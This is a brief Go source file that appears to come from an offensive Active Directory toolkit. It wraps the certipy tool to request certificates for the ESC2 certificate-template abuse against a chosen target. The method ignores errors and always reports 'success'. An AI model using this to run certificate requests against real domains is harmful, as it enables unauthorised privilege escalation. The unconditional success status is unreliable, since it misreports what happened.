package adcs

import "os/exec"

type ESC2 struct {
Target   string
Template string
}

func (e ESC2) RequestCertificate() ESCResult {
cmd := exec.Command("certipy", "req", "-target", e.Target, "-template", e.Template)
out, _ := cmd.Output()
return ESCResult{Status: "success", Output: string(out)}
}
